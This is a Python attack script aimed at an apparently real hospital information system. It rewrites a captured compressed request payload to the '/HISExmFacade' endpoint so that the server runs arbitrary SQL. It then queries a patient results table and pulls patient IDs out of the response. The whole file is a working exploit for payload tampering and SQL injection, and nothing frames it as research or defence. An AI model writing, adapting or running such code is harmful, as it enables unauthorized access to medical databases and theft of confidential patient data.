from his_client_final import HISClient
import requests
import zlib
import re

class PatResultDateSampler(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = PatResultDateSampler()

# Query simplified date range recent
print("Sampling PAT_RESULTH by date > 20260215...")
# Avoid TO_DATE if possible, or use simple string
sql = "SELECT PRH_PAT_ID, PRH_TRX_DT FROM OPDUSR.PAT_RESULTH WHERE PRH_TRX_DT > TO_DATE('20260215','YYYYMMDD') AND ROWNUM <= 10"
res = hunter.execute_sql(sql)

if res and "<NewDataSet>" in res:
    print("!!! FOUND SAMPLE IDs !!!")
    print(res[:2000])
    ids = re.findall(r'<PRH_PAT_ID>(.*?)</PRH_PAT_ID>', res)
    print(f"IDs found: {ids}")
else:
    print("[-] No sample found (maybe date format wrong or query slow?).")

